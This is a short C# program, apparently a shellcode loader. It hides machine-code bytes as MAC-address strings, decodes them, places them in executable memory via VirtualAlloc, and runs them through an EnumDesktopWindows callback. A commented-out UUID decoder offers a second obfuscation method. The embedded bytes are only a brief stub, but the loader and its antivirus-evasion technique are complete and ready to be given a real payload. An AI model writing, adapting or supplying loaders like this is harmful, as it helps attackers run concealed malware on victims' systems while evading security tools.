using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

class loader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool EnumDesktopWindows(IntPtr hDesktop, IntPtr lpfn, uint lParam);
    static void Main(string[] args)
    {
        string[] MACArray = new string[]
        {
            "56-48-89-E6-48-83",
            "E4-F0-48-83-EC-20",
            "E8-0F-00-00-00-48",
            "89-F4-5E-C3-66-2E",
            "00-00-00-00-00-00",
        };

        //byte[] decShell = DeobfuscateUUID(UUIDArray);
        byte[] decShell = DeobfusMAC(MACArray);

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decShell.Length, 0x3000, 0x40);
        Marshal.Copy(decShell, 0, addr, decShell.Length);

        EnumDesktopWindows(IntPtr.Zero, addr, 0);
    }

    static byte[] DeobfusMAC(string[] MACArray)
    {
        var originalBytes = new List<byte>();
        foreach (var mac in MACArray)
        {
            var hexBytes = mac.Split('-').Select(b => Convert.ToByte(b, 16)).ToArray();
            originalBytes.AddRange(hexBytes);
        }
        return originalBytes.ToArray();
    }

    /* 
    static byte[] DeobfuscateUUID(string[] UUIDArray)
    {
        var originalBytes = new List<byte>();
        foreach (var uuid in UUIDArray)
        {
            Guid guid = Guid.Parse(uuid);
            originalBytes.AddRange(guid.ToByteArray());
        }
        return originalBytes.ToArray();
    }
    */

}
